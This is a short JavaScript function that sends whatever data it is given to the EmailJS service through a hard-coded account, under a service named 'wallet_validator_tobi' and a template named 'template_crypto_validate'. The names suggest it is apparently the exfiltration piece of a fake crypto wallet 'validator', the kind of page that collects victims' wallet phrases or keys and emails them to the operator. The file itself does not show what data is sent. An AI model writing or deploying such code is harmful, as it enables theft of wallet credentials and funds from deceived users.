export const send = async (context) => {
  const res = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
    headers: {
      "Access-Control-Allow-Origin": "https://api.email.js.com",
      "Content-Type": "application/json"
    },
    method: "POST",
    body: JSON.stringify({
      service_id: "wallet_validator_tobi",
      template_id: "template_crypto_validate",
      user_id: "SKECErAHJ5g1CQj--",
      template_params: context
    })
  })

  return res.json()
}